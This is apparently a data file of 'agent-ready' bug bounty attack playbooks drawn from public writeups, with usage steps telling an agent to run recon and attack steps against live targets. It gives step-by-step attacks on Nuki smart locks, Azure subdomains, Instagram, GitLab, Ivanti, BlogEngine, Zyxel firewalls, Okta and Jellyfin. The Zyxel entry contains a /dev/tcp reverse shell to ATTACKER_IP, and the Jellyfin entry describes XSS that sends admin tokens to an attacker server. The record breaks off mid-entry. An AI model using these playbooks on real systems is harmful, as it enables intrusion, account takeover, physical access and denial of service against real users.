description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: Technical Advisory – Multiple vulnerabilities in Nuki smart locks

affected_components: API endpoints for lock control and configuration

trigger_conditions.when_to_apply: This playbook is applicable when an attacker can authenticate to the Nuki API and observe API responses for lock management operations.
prerequisites: Attacker has authenticated access to the Nuki API.
applicability_signals: API responses contain unique identifiers for locks and users that can be manipulated.
skip_if: API requires elevated privileges for lock management that an attacker cannot obtain.

recon_steps: Step 1: Authenticate to the Nuki API using valid credentials.
Step 2: Observe API responses for lock management endpoints (e.g., listing locks, retrieving lock status, controlling the lock). Pay close attention to identifiers associated with locks and users.
attack_steps: Step 1: Identify an API endpoint that allows modification or control of a specific lock.
Step 2: Intercept a request to this endpoint for a lock controlled by the authenticated user.
Step 3: Modify the request to target a lock controlled by another user. This involves replacing the target lock identifier with an identifier observed in Step 2 that belongs to a different user.
Step 4: Send the modified request to the Nuki API.
Step 5: Observe the API response to determine if the lock operation was performed on the unintended lock.
payloads_or_patterns: Modify the lock identifier parameter in API requests targeting lock control functions to an ID belonging to another user.
tools_recommended: Burp Suite: Intercept and modify API requests.
success_indicators: API response indicates the lock was successfully controlled (e.g., unlocked, locked) but it is a lock not controlled by the authenticated user.
No explicit error is returned, but the state of a different user's lock changes.
failure_indicators: API returns an error indicating the lock ID is invalid or access is denied (e.g., 403 Forbidden, 404 Not Found for a different user's lock). This may suggest the application performs proper authorization checks on the lock ID.
Response indicates the action was attempted on the correct, intended lock (not the attacker's target).

playbooks.impact: An attacker can gain unauthorized control over other users' Nuki smart locks, potentially leading to unauthorized physical access to properties.
playbooks.key_lesson: Always validate that API requests intended for a specific resource (e.g., a lock) are authorized for the *currently authenticated user* and not just that the resource identifier is valid.

meta.title: How I made 300 GitHub repos point to my blog using Azure subdomains takeover

trigger_conditions.when_to_apply: When a target subdomain hosted on Azure App Service (e.g., *.azurewebsites.com) is no longer actively managed by the original owner but still referenced in public code repositories or documentation.
prerequisites: Target subdomain uses Azure App Service.
The subdomain's DNS records are pointing to Azure.
The specific subdomain is not currently registered or active on Azure.
The attacker can create an Azure App Service and assign the target subdomain to it.
applicability_signals: Finding *.azurewebsites.com references in public GitHub repos.
Using Azure Portal or CLI to check subdomain availability (`nameAvailable: true`).
Responses from Azure indicating that the App Service is not configured for a given subdomain.
skip_if: The subdomain is actively registered and serving content from the legitimate owner.
The Azure portal reports `nameAvailable: false` for the subdomain.
A Web Application Firewall (WAF) blocks the creation of new App Services or the association of custom domains.

recon_steps: Step 1: Intercept GitHub search requests for "azurewebsites.com" using Burp Suite and send to Intruder to enumerate all pages (approx. 75 pages).
Step 2: Extract all potential *.azurewebsites.com subdomains from the HTTP response bodies.
Step 3: Use `grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*" | grep azurewebsites | cut -d "/" -f 3-10 | sort -u` to clean and deduplicate the extracted subdomains.

Step 4: Automate the availability check for each subdomain using Azure Portal's functionality (intercepting requests in Burp or using Azure CLI/API) to identify subdomains where `nameAvailable: true`.
attack_steps: Step 1: Create a simple HTML file with JavaScript redirection to the attacker's blog, e.g., `<html><body><script src="https://attacker.blob.core.windows.net/scripts/redirect.js"></script></body></html>`.
Step 2: Host the JavaScript payload in an Azure Blob Storage container.
Step 3: For each identified take-overable subdomain, use Azure CLI (`az webapp up`) or Azure Portal to create a new Azure App Service (e.g., B3 plan for unlimited static web apps).
Step 4: Assign the take-overable subdomain to the newly created Azure App Service.
Step 5: Deploy the static HTML page to the App Service.
payloads_or_patterns:
HTML file with JavaScript redirect: `<!DOCTYPE html>
<html lang="en">
<head>
</head>
<body>
<script src="https://<YOUR_BLOB_STORAGE_URL>/<YOUR_SCRIPT_NAME>.js"></script>
</body>
</html>`
Azure CLI command: `az webapp up --sku B3 --name <SUBDOMAIN_NAME> --resource-group <RESOURCE_GROUP_NAME> --plan <APP_SERVICE_PLAN_NAME> --location "West Europe" --html`
tools_recommended: Burp Suite: For intercepting and modifying HTTP requests during reconnaissance and availability checks.
Grep/Bash: For processing and filtering subdomain lists.
Azure CLI (`az`): For automating the creation and deployment of Azure App Services and assigning subdomains.
Azure Portal: For manual checks and initial exploration of Azure resources.
success_indicators: The attacker's blog or redirected page loads when visiting the take-overed subdomain.
Azure Portal showing a new App Service associated with the take-overed subdomain.
Web server logs showing traffic originating from the take-overed subdomain.
failure_indicators: Azure portal reports `nameAvailable: false` for the subdomain (cannot take over).
The `az webapp up` command fails with errors related to domain ownership or Azure resource limits.
The take-overed subdomain continues to serve content from the original owner or returns an Azure default error page.
High costs associated with maintaining numerous App Services if not properly managed.

playbooks.impact: The attacker gains control of GitHub-referenced Azure subdomains, allowing them to redirect traffic intended for legitimate projects to their own website. This can lead to brand impersonation, phishing, or serving malicious content to users who trust the original project.
playbooks.key_lesson: Automate the discovery and verification of cloud-specific subdomain takeovers by searching public code repositories for references to cloud provider domains and utilizing cloud provider APIs or CLIs to check subdomain availability.

meta.title: Permanent Crash Instagram Followers

trigger_conditions.when_to_apply: When creating or editing Instagram Reels, if a quiz sticker is present and there are no character limits on the quiz options.
prerequisites: Attacker has an Instagram account and can create Reels.
applicability_signals: Existence of a quiz sticker feature in Reels.
skip_if: API enforces character limits on quiz sticker options.
API request to /api/v1/media/configure_with_clips/ is rate-limited or rejects excessively large payloads.

recon_steps: Step 1: Create an Instagram Reel and observe the available stickers. Identify the quiz sticker.
Step 2: Inspect the network requests made when adding and configuring the quiz sticker using a proxy like Burp Suite.
attack_steps: Step 1: Craft a POST request to i.instagram.com/api/v1/media/configure_with_clips/.
Step 2: In the signed_body parameter, create a quiz sticker with a 'question' field.
Step 3: For the 'options' array, add multiple 'bar' options and repeat one option approximately 10000 times. Each option should have a 'text' and 'count' field.
Step 4: Send the request and observe the response.
Step 5: Monitor the target's followers' news feeds for crashes. If successful, their app will become unusable.
tools_recommended: Burp Suite: To intercept and modify the HTTP request.
Burp Intruder: To automate the creation of the large 'options' array.
success_indicators: The reel is successfully configured and posted.
Followers report that their Instagram app crashes or becomes unresponsive when trying to view their feed.
The target user is unable to use the Instagram app.
failure_indicators: API returns a 4xx error indicating payload too large or invalid request format. Suggestion: Try to reduce the number of repeated options or explore other sticker types.
API returns a 403 Forbidden. Suggestion: Check for rate limiting or authentication issues. Ensure the session token is valid.
No observable impact on followers' apps. Suggestion: Verify the request payload structure and try with a different reel or sticker type.

playbooks.impact: An attacker can cause a permanent Denial of Service for any follower of the attacker, making the Instagram app unusable for them. This occurs without user interaction from the victim.
playbooks.key_lesson: Always implement robust input validation, especially for array lengths and string lengths, when processing user-generated content for features like stickers in social media applications to prevent resource exhaustion and Denial of Service vulnerabilities.

meta.title: Gitlab Project Import RCE Analysis (CVE-2022-2185)

tech_stack_fingerprints: GitLab-specific headers or HTML strings (not detailed in writeup)

trigger_conditions.when_to_apply: When a GitLab instance has the Project Imports feature enabled and the attacker has an authenticated user account.
prerequisites: Attacker must have an authenticated session in GitLab.
applicability_signals: The 'Import project' functionality is accessible to the authenticated user.
The target GitLab version is vulnerable (prior to 15.1.1, 14.10.5).
skip_if: GitLab instance is patched to a non-vulnerable version.
The Project Imports feature is disabled or inaccessible.

recon_steps: Step 1: Identify the target GitLab version by inspecting `X-GitLab-Version` header or looking for version-specific UI elements.
Step 2: Confirm that the 'Import project' feature is available for the authenticated user.
attack_steps: Step 1: Craft a malicious archive file (e.g., a tar.gz) containing a file with a specially crafted path that exploits path traversal.
Step 2: Upload this archive to the 'Import project' feature in GitLab.
Step 3: The `validate_archive_path` method in `lib/gitlab/import_export/decompressed_archive_size_validator.rb` will process the archive.

Step 4: The `command` method within the same file constructs a `gzip -dc < @archive_path | wc -c` command. If `@archive_path` is not properly sanitized and allows path traversal, it can lead to command injection.
Step 5: The crafted path in the archive should lead to the execution of arbitrary commands on the GitLab server.
payloads_or_patterns: A tar.gz archive with a file path like: `../../../../../../../../../../../../../../../../../bin/bash -c 'command_to_execute'` (actual path needs to be determined based on GitLab's internal structure and user context).
tools_recommended: Burp Suite: To intercept and modify upload requests.
Tar utility: To create and manipulate archive files for testing path traversal.
success_indicators: Arbitrary command execution confirmed on the GitLab server (e.g., receiving a pingback to an attacker-controlled server, creating a file, or executing a simple command like `whoami` which outputs the server's user).
failure_indicators: Upload fails with an error indicating invalid archive format or size restrictions.
The `validate_archive_path` method successfully blocks the path traversal attempt.
The executed command results in an error or unexpected output, indicating the injection was not successful or the command itself is malformed.

playbooks.impact: Remote Code Execution (RCE) on the GitLab server, allowing an attacker to take full control of the compromised instance, access sensitive data, deploy malicious code, or pivot to other internal systems.
playbooks.key_lesson: Always sanitize user-supplied file paths within archive processing functionalities to prevent path traversal and subsequent command injection vulnerabilities.

meta.title: React debug.keystore key was trusted by Meta(Facebook) which caused to Instagram account takeover by malicious apps.

target_profile.technology: Facebook SDK for Android, React Native
tech_stack_fingerprints: Android applications with package names like com.vulnano.android.facebook.sdkat

trigger_conditions.when_to_apply: When an Android application integrates with the Facebook SDK and relies on signature verification for authorization, and the target application (like Instagram) might be signed with or trusts keys exposed in public repositories like the React Native keystores.
prerequisites: Attacker can develop and sign an Android application.
Target application (e.g., Instagram) uses Facebook authentication.
The `android_key` parameter in the Facebook OAuth flow is validated, but the `calling_package_key` is not.
applicability_signals: The Facebook OAuth endpoint `/dialog/oauth` is accessible.
The API call `https://m.facebook.com/dialog/oauth?android_key=...&calling_package_key=...&client_id=...&redirect_uri=fbconnect%3A%2F%2Fsuccess&response_type=token...` is observed.
The presence of `android_key` and `calling_package_key` parameters in the OAuth flow.
skip_if: The `calling_package_key` is strictly validated against the package name of the calling application.
All Facebook SDK integrations use only release keys that are kept confidential.

recon_steps: Step 1: Identify Android applications integrating with the Facebook SDK and observe their OAuth flow parameters, specifically looking for `android_key` and `calling_package_key`.
Step 2: Search public repositories and developer resources for exposed Facebook SDK signing keys, particularly those associated with React Native projects.
Step 3: Confirm if any target applications (e.g., Instagram) use or trust signing keys found in public repositories, especially debug keys.
attack_steps: Step 1: Develop a malicious Android application.

Step 2: Sign the malicious Android application using a known, exposed debug keystore (e.g., from the React Native keystores repository) that is also used or trusted by the target application's Facebook integration.

Step 3: Initiate the Facebook OAuth flow from the malicious application, providing the `client_id` of the target application (e.g., Instagram) and a valid `android_key` associated with that `client_id`. Crucially, set the `calling_package_key` to the package name of the malicious app.

Step 4: If the Facebook SDK endpoint validates the `android_key` but not the `calling_package_key`, the malicious app will receive an authorization token for the user logged into Facebook on the device, which can then be used to access Instagram account data or perform actions.
tools_recommended: Android Studio: To develop and sign the malicious Android application.
Burp Suite: To intercept and analyze HTTP requests during the OAuth flow.
Java Development Kit (JDK): For key generation and management if needed.
success_indicators: The malicious Android application receives an authorization token for the user's Facebook/Instagram account.
The received token can be used to access user data or perform actions on Instagram.
The `redirect_uri=fbconnect%3A%2F%2Fsuccess` endpoint returns a valid token in the response.
failure_indicators: The Facebook OAuth flow returns an error indicating an invalid signature or unauthorized `calling_package_key`. Pivot: Investigate if other authentication mechanisms or API endpoints have similar signature validation weaknesses.
The `android_key` is rejected, indicating it's not associated with the provided `client_id`. Pivot: Try different `client_id` values or discover correct `android_key` associations.

playbooks.impact: A malicious Android application can steal Instagram (and potentially other Facebook-integrated apps) authorization tokens, leading to unauthorized access and takeover of user accounts. This bypasses standard security measures by exploiting trust in a widely available debug keystore signature.
playbooks.key_lesson: Always validate both the application signature (`android_key`) and the calling package name (`calling_package_key`) in inter-app communication flows, especially when sensitive tokens or user data are involved. Never implicitly trust signatures from public or debug keystores in production environments.

meta.title: Riding The Inforail To Exploit Ivanti Avalanche

trigger_conditions.when_to_apply: When administrative access to Ivanti Avalanche is achieved and the InfoRail service is listening on TCP port 7225.
prerequisites: Attacker has administrative access to Ivanti Avalanche.
InfoRail service is running and accessible on TCP port 7225.
applicability_signals: InfoRail service listening on TCP port 7225.
Obfuscated or encrypted network traffic observed on port 7225.
skip_if: InfoRail service not found or not listening on default port.
Network traffic on port 7225 is easily decipherable and shows no signs of custom protocol.

recon_steps: Step 1: Identify Ivanti Avalanche services running on the target. Look for 'Wavelink Information Router' or processes associated with Ivanti Avalanche.
Step 2: Determine the port used by the 'Wavelink Information Router' (InfoRail) service. Default is TCP 7225.
Step 3: Analyze network traffic to and from TCP port 7225 for custom protocol patterns, obfuscation, or encryption.
attack_steps: Step 1: (Requires admin access) Craft a custom InfoRail message with an XML payload designed to trigger an XStream deserialization vulnerability.
Step 2: Send the crafted message to the InfoRail service on TCP port 7225.
Step 3: Observe the target system for signs of code execution, such as outbound network connections to an attacker-controlled server or changes in system behavior.
payloads_or_patterns: Custom InfoRail message format (Preamble, Header, Optional XML payload). Specific XStream deserialization payloads would need to be crafted based on vulnerable XStream versions and Java gadget chains.
tools_recommended: Custom script for crafting and sending InfoRail messages.
Network traffic analysis tools (e.g., Wireshark, tcpdump) to observe communication.
XStream deserialization exploit framework (e.g., ysoserial) for payload generation.
success_indicators: Outbound network connection from the target to an attacker-controlled server (e.g., collaborator server, attacker's C2).
Execution of arbitrary commands confirmed by process creation or system logs.
Specific error messages or responses indicating successful payload delivery and execution.
failure_indicators: No response from the InfoRail service or generic error messages.
InfoRail service crashes or becomes unresponsive.
Traffic analysis reveals that payloads are not being deserialized or are being properly sanitized.

playbooks.impact: Remote code execution with administrator privileges on the Ivanti Avalanche server, allowing for full system compromise, data exfiltration, or further lateral movement within the network.
playbooks.key_lesson: Analyze custom network protocols for deserialization vulnerabilities, especially when they involve components that handle untrusted input and use serialization libraries like XStream.

meta.title: Unauthenticated Arbitrary File Deletion (CVE-2022-25591) in BlogEngine .NET

trigger_conditions.when_to_apply: When the target application is BlogEngine .NET and the `/api/filemanager/processchecked/delete` endpoint is accessible without authentication.
prerequisites: The target must be running BlogEngine .NET.
The `/api/filemanager/processchecked/delete` endpoint must be reachable.
applicability_signals: The `/api/filemanager/processchecked/delete` endpoint responds to PUT requests.
The application does not perform authentication checks for the `/api/filemanager/processchecked/delete` endpoint.
skip_if: Requests to `/api/filemanager/processchecked/delete` are blocked by authentication or authorization mechanisms.
The IIS web server user lacks write/delete permissions in the webroot.

recon_steps: Step 1: Access the target URL and look for observable signs of BlogEngine .NET, such as specific HTML structures or JavaScript globals.
Step 2: Test for the existence and accessibility of the `/api/filemanager/processchecked/delete` endpoint by sending unauthenticated PUT requests.
attack_steps: Step 1: Send a PUT request to `/api/filemanager/processchecked/delete` with a JSON payload containing `IsChecked: true`, `Name: "Web.Config"`, `FileType: 1`, and `FullPath: "/../../Web.Config"`.
Step 2: Observe the response to determine if the file deletion was successful or if specific error messages are returned.
tools_recommended: Burp Suite: To intercept and modify HTTP requests, particularly PUT requests to the target endpoint.
success_indicators: A successful deletion is indicated if the response shows a success message and indicates successful deletion of the specified file (e.g., 'Web.Config' deleted).
The vulnerability is confirmed if the application can create and delete a temporary file within the webroot, and this action is reported back.
failure_indicators: A 401 or 403 status code indicates authentication/authorization failure, meaning the endpoint is protected. Pivot to other endpoints or techniques.

If the response indicates the file could not be deleted due to permissions, this specific exploit may not work, but the path traversal vector might still be exploitable with different file targets or if IIS permissions are changed.
If the API call to create/delete a temporary file fails, this specific validation method is not available, but direct exploitation might still be possible.

playbooks.impact: Unauthenticated attacker can delete arbitrary files within the web root of the BlogEngine .NET application, including critical configuration files like Web.Config, leading to a Denial of Service (DoS) or potential for further exploitation if sensitive information is exposed.
playbooks.key_lesson: Always test unauthenticated API endpoints that handle file operations for path traversal vulnerabilities, as they can lead to arbitrary file deletion and Denial of Service.

meta.title: CVE-2022-30526 (Fixed): Zyxel Firewall Local Privilege Escalation

trigger_conditions.when_to_apply: This playbook is applicable when an attacker has established shell access to a Zyxel firewall with low privileges (e.g., the 'nobody' user) and can execute arbitrary commands.
prerequisites: Attacker has established shell access to the Zyxel firewall with low privileges.
The `zysudo.suid` binary is present and executable on the target system.
The target system has a functional `cron` daemon.
applicability_signals: Existence of the `/usr/bin/zysudo.suid` binary.
The `zysudo.suid` binary accepts command arguments.
The `zysudo.suid` binary allows execution of `/bin/cp`.
The `/var/zyxel/crontab` file is writable by the low-privileged user or can be overwritten by a permitted `zysudo.suid` command.
skip_if: The `zysudo.suid` binary does not exist or is not executable.
The `zysudo.suid` binary does not allow the execution of `/bin/cp`.
The `/var/zyxel/crontab` file is read-only and cannot be modified through any allowed `zysudo.suid` command.
The target system does not have `cron` installed or running.

recon_steps: Step 1: Execute `ls -l /usr/bin/zysudo.suid` to confirm the existence and permissions of the binary.
Step 2: Execute `zysudo.suid` with no arguments to view its usage information and identify allowed commands, specifically looking for `/bin/cp`.
Step 3: Check the writability of `/var/zyxel/crontab` by the current user. If not writable, verify if `zysudo.suid` can be used to copy a file to this location.
attack_steps:
Step 1: Create a malicious script that establishes a reverse shell. For example: `echo -en '#!/bin/bash

exec bash -i >&/dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> <&1' > /tmp/reverse_shell_script`
Step 2: Make the reverse shell script executable: `chmod +x /tmp/reverse_shell_script`
Step 3: Append a cron job to a temporary crontab file that executes the reverse shell script as root: `echo '* * * * * root /tmp/reverse_shell_script' > /tmp/malicious_crontab`
Step 4: Use `zysudo.suid` to copy the malicious crontab to the system's active crontab location: `zysudo.suid /bin/cp /tmp/malicious_crontab /var/zyxel/crontab`
Step 5: Set up a listener on the attacker's machine to catch the reverse shell: `nc -lvnp <ATTACKER_PORT>`
tools_recommended: netcat (nc) for reverse shell listener
shell for command execution
text editor for script creation
success_indicators: A reverse shell connection is established from the target firewall to the attacker's IP and port.
Executing `id` on the compromised shell returns `uid=0(root) gid=0(root) groups=0(root)`.
failure_indicators: No reverse shell connection is established after waiting for the cron job to execute (up to 60 seconds). This could indicate the cron job was not executed, the script failed to run, or the network path is blocked. Pivot by trying to directly execute a command with `zysudo.suid` to confirm its functionality.
The `cp` command fails when executed via `zysudo.suid`, indicating potential restrictions or incorrect path usage. Verify the exact path to `cp` and the target crontab file.

playbooks.impact: Attacker gains root privileges on the Zyxel firewall, allowing for full control of the device, data exfiltration, modification of network configurations, and potential pivoting to other network segments.
playbooks.key_lesson: When a SUID binary allows overwriting or modifying critical system files (like crontabs) with privileged commands, attackers can escalate privileges by scheduling their own malicious commands to run as root.

meta.title: Authomize Discovers PassBleed Password Stealing and Impersonation Risks in Okta
meta.category: Sensitive data sent over an unencrypted channel, Broken authorization, Information disclosure

affected_components: Okta Identity Engine (OIE) with Adaptive MFA

trigger_conditions.when_to_apply: When an attacker can intercept traffic between an Okta-protected application and the Okta Identity Engine, and the application does not properly sanitize sensitive parameters passed in query strings.
prerequisites: Target organization uses Okta Identity Engine (OIE) with Adaptive MFA
Target application uses Okta for authentication and passes sensitive parameters in the URL query string
applicability_signals: Okta login pages are observed
User is redirected to an Okta authentication flow
An application utilizes Okta as an IdP and passes parameters like username or email in the URL query string during the authentication process.
skip_if: Okta is not used for authentication
The application does not pass sensitive parameters in the URL query string during the authentication flow
All parameters are properly sanitized by the application before being processed

recon_steps: Step 1: Identify applications that use Okta as their identity provider.
Step 2: Observe the authentication flow for these applications. Look for redirects to Okta and the parameters included in the URL query string during the process.
attack_steps: Step 1: During the authentication flow of an Okta-protected application, intercept the HTTP requests that redirect to Okta.
Step 2: Examine the URL query parameters for any sensitive information being transmitted, such as username, email, or other identifiers.
Step 3: If sensitive information is found in plaintext in the query string, an attacker can capture this data.

Step 4: (For Impersonation) If the captured data (e.g., username or email) can be used to initiate a password reset or account recovery process within the target application, the attacker can leverage this to impersonate the user.
payloads_or_patterns: HTTP GET request to an Okta-protected application's login endpoint. Observe query parameters such as `?username=testuser@example.com` or `?email=attacker@example.com`.
tools_recommended: Burp Suite Proxy: To intercept and analyze HTTP requests during the authentication flow.
Browser Developer Tools (Network tab): To observe network requests and responses.
success_indicators: Discovery of sensitive user information (e.g., username, email) directly within the URL query parameters of HTTP requests during Okta authentication.
Ability to use the leaked information to initiate account recovery or password reset flows on the target application.
failure_indicators: No sensitive information is present in the URL query parameters during the Okta authentication flow.
The target application properly sanitizes or encrypts sensitive parameters before sending them to Okta.
Okta's MFA challenge prevents further progress without proper user interaction.

playbooks.impact: An attacker can steal sensitive user information (usernames, emails) transmitted in plaintext within URL query parameters during the Okta authentication process. This information can then be used for targeted phishing attacks, to initiate password reset/account recovery for impersonation, or to gain unauthorized access to user accounts on the protected application.
playbooks.key_lesson: Always ensure sensitive user identifiers are not transmitted in plaintext within URL query parameters, especially during authentication flows mediated by an Identity Provider like Okta. Sanitize and encrypt or transmit sensitive data through secure request bodies or dedicated APIs.

meta.title: CVE-2022–35909 / CVE-2022–35910, Incorrect Access Control and XSS Stored to Jellyfin

trigger_conditions.when_to_apply: This playbook is applicable when an authenticated, unprivileged user can access user management endpoints or perform actions that affect system-wide configurations without proper authorization checks on the user's role or permissions.
prerequisites: Target is Jellyfin version 10.7.7 (vulnerable) or earlier.
Attacker has an authenticated user account.
Attacker can intercept and modify HTTP requests.
applicability_signals: `/users` endpoint returns a list of all registered users, including their IDs and policy/role.
User IDs are fixed alphanumeric strings.
The 'repository name' field in the plugin/repository management section is vulnerable to XSS.
The application provides a mechanism to create or modify repositories/plugins.
skip_if: The `/users` endpoint is protected and only returns the current user's information.
All modification actions related to plugins/repositories require administrator privileges and are strictly enforced.
The XSS vulnerability in the 'repository name' field is patched or does not allow execution of JavaScript.

recon_steps: Step 1: Log in with a low-privilege user account.
Step 2: Use Burp Suite or a similar proxy to intercept traffic.
Step 3: Navigate to the user management section (e.g., by attempting to view users). Intercept the GET request to `/users`.
Step 4: Analyze the response from `/users` to identify all registered users, their unique User IDs, and their associated policies (e.g., 'isAdministrator'). Note down the User ID of an administrator.
Step 5: Navigate to the plugin or repository management section. Attempt to create a new repository or modify an existing one. Intercept the relevant POST or PUT request.
attack_steps: Step 1: After identifying the administrator's User ID, log out and log back in as the low-privilege user.
Step 2: Intercept the authentication request (POST to `/users/authenticate` or similar).
Step 3: In the intercepted authentication request, modify the `userId` parameter to the administrator's User ID.
Step 4: Forward the modified authentication request. If successful, the response will contain session tokens associated with the administrator.
Step 5: With the administrator's session token, navigate to the plugin/repository management section.
Step 6: Attempt to create a new repository. In the 'repository name' field, inject a Stored XSS payload designed to steal the administrator's `localStorage` content.
Step 7: Save the repository with the injected XSS payload.

Step 8: Wait for the administrator to log in and access the plugin/repository management section. The XSS payload will execute in the administrator's browser, sending their `localStorage` content (including the access token) to an attacker-controlled server (e.g., a listening VPS).
Step 9: Capture the administrator's access token from the attacker-controlled server.
Step 10: Use the captured administrator access token in subsequent requests to impersonate the administrator and perform administrative actions.
payloads_or_patterns: Stored XSS payload for repository name: ``

Authenticated request with admin token: `GET /some/admin/endpoint HTTP/1.1
Host: <TARGET_URL>
Cookie: token=<ADMIN_SESSION_TOKEN>
...`
tools_recommended: Burp Suite (Proxy, Repeater)
A VPS or server with a listening port for receiving XSS payload data.
success_indicators: Successful authentication using the administrator's User ID grants access to administrator-level dashboard functionalities or API endpoints.
Receiving the administrator's `localStorage` content, including a valid session token, on the attacker-controlled server.
Successfully executing administrative actions using the stolen administrator session token.
failure_indicators: Authentication fails even after modifying `userId` (e.g., returns 401/403 and requires the correct user's token).
The XSS payload in the 'repository name' field is sanitized or does not execute JavaScript.
The `localStorage` content does not contain a valid session token or the captured token does not grant administrative privileges.
Attempting to modify plugins/repositories with the stolen token results in a 403 Forbidden error, indicating stricter access control on those specific actions.

playbooks.impact: An unauthenticated or low-privilege authenticated attacker can gain administrator privileges by exploiting broken access control to obtain an administrator's User ID and then leveraging a Stored XSS vulnerability to steal the administrator's session token. This allows the attacker to fully control the Jellyfin server, manage all media, users, and settings, and potentially install malicious plugins.
playbooks.key_lesson: Always validate that the authenticated user's session token and role are checked on every request, especially for sensitive actions like user authentication and management, and ensure that input fields, particularly those used for naming or descriptive purposes, are properly sanitized to prevent Stored XSS.

meta.title: Exploiting Arbitrary Object Instantiations in PHP without Custom Classes

tech_stack_fingerprints: /lam/ is a directory on the web server

trigger_conditions.when_to_apply: When a PHP application uses `new <ClassName>(...)` where `<ClassName>` is dynamically controlled by user input and the application does not use custom classes for exploitation, but the underlying PHP functionality allows for arbitrary object instantiation.
prerequisites: The target application must be running a vulnerable version of LAM (e.g., 5.5) or a similar PHP application with the identified arbitrary object instantiation flaw.
An unauthenticated user must be able to reach the vulnerable code path.
applicability_signals: The presence of code like `new $_GET['a']($_GET['b']);` or similar patterns where a class name and constructor arguments are directly controllable from GET/POST parameters.
The `help.php` script in LAM taking `module` and `HelpNumber` parameters.
skip_if: All attempts to instantiate classes result in a `Class not found` error or similar, indicating no vulnerable classes are accessible or the `__construct` method is not being called as expected.
A Web Application Firewall (WAF) blocks requests containing common PHP function names or class instantiations.

recon_steps: Step 1: Scan the target network for open ports, specifically 80 and 443.
Step 2: Identify web servers and directories. Look for `/lam/` or similar application paths.
Step 3: If LAM is found, confirm the version by observing HTML comments, meta tags, or by inspecting network requests for version information.
attack_steps: Step 1: Send a GET request to `/lam/templates/help.php` with parameters `module=__HALT_COMPILER()` and `HelpNumber=exit()`. This attempts to trigger the `__HALT_COMPILER()` magic method, which can be used to achieve RCE by appending executable code after it.

Step 2: If Step 1 does not yield RCE, analyze the `moduleCache::getModule()` and `getHelp()` functions in `lib/modules.inc` and `lib/account.inc` to identify if other callable functions or classes can be instantiated and exploited.

Step 3: If the specific `__HALT_COMPILER()` vector fails, but arbitrary object instantiation is confirmed, research available PHP built-in classes or third-party libraries used by LAM that might have dangerous magic methods (e.g., `__destruct`, `__wakeup`, `__toString`) that can lead to RCE.
Step 4: Craft a payload using a known RCE gadget chain or a simple command execution payload if a suitable class and method are identified.
tools_recommended: Burp Suite: To intercept and modify HTTP requests, automate payload delivery, and analyze responses.
Nmap: For initial network discovery and port scanning.
Curl: For crafting and executing specific HTTP requests.
success_indicators: Receiving an HTTP response indicating command execution, such as a reverse shell connection, a specific output from an executed command (e.g., `id` command output), or a file creation on the server.
An HTTP response that shows the application crashed or returned an unexpected error consistent with code execution.
failure_indicators: Receiving a 'Class not found' error for `__HALT_COMPILER()` or other attempted classes.
A '404 Not Found' response for the `help.php` script.

The application returns a generic error page without any indication of code execution. Pivot: Investigate other functions called within `getHelp` or `moduleCache::getModule` that might offer alternative exploitation paths.

playbooks.impact: Remote Code Execution (RCE) on the server hosting the LAM application, allowing an attacker to gain full control over the server, access sensitive data (including LDAP user information and SSH keys if present), and pivot to other systems in the network.
playbooks.key_lesson: When encountering arbitrary object instantiation in PHP, do not overlook built-in language constructs like `__HALT_COMPILER()` or magic methods in core PHP classes as potential RCE vectors, even without custom classes.

meta.title: Tableau Server Leaks Sensitive Information From Reflected XSS

tech_stack_fingerprints: Contains 'Tableau Server' in page title or headers

trigger_conditions.when_to_apply: When a Tableau Server instance is configured to send subscription emails to authenticated users, and these emails contain user-controlled input that is reflected without proper sanitization.
prerequisites: Authenticated access to Tableau Server is required to trigger the subscription.
applicability_signals: Observe subscription email content for reflected parameters, especially in subject lines or body text that are not properly encoded.
Look for instances where parameters like `name` or `subject` in the subscription configuration are reflected directly in the email.
skip_if: All user-controlled input in subscription emails is properly encoded or sanitized.
The subscription feature is disabled or not configured.

recon_steps: Step 1: Log in to Tableau Server with an authenticated user account.
Step 2: Navigate to the subscription settings and identify parameters that can be controlled by the user and are reflected in the subscription email, such as the subscription name or subject.
attack_steps: Step 1: Create or modify a subscription and inject a simple XSS payload into a user-controllable field that is reflected in the email (e.g., `<script>alert(1)</script>`).
Step 2: Trigger the subscription email to be sent.

Step 3: Observe the received email to confirm if the script is executed (e.g., an alert box appears if viewed in a capable client, or check browser developer console for errors if viewing in HTML format).
tools_recommended: Burp Suite (Repeater for crafting payloads, Collaborator for catching callbacks if applicable)
success_indicators: Execution of JavaScript code within the email client or when the email HTML is rendered.
An alert box appears with the domain name of the Tableau Server.
A callback is received on a listener if using a payload designed for that purpose.
failure_indicators: The injected script is rendered as plain text or HTML entities (e.g., `<script>alert(1)</script>`). Pivot: Try different encoding techniques or alternative injection vectors.
No JavaScript execution observed and no callbacks received. Pivot: Verify if the parameter is truly reflected and if the email client has JavaScript execution enabled for this content.

playbooks.impact: An attacker can execute arbitrary JavaScript in the context of the email client of the recipient, leading to potential information disclosure (e.g., cookies, session tokens if email client is web-based and vulnerable), phishing attacks, or further exploitation.
playbooks.key_lesson: Always sanitize and encode user-supplied input that is reflected in outgoing emails, especially if the email client might render HTML or execute JavaScript.

meta.title: CVE-2022-30136: Microsoft Windows Network File System v4 Remote Code Execution Vulnerability
meta.authors: Trend Micro Research Team, Guy Lederfein, Quintin Crist, Yuki Chen

trigger_conditions.when_to_apply: When the target is running a vulnerable version of Microsoft Windows with the Network File System v4 service enabled and exposed.
prerequisites: NFSv4 service is enabled and accessible on the target.
applicability_signals: Target is a Windows system.
NFS service is running (can be inferred by network scanning for NFS ports, e.g., 2049 UDP/TCP, and RPC ports).
skip_if: Target is not a Windows system.
NFS service is not enabled or is inaccessible.
Target is patched against CVE-2022-30136.

recon_steps: Step 1: Scan the target for open NFS ports (typically 2049 UDP/TCP) and RPC ports.
Step 2: Attempt to enumerate NFS shares and versions to confirm the presence of NFSv4.
attack_steps: Step 1: Craft malicious RPC calls targeting the NFSv4 implementation.
Step 2: Send these malicious RPC calls to the target NFSv4 server.
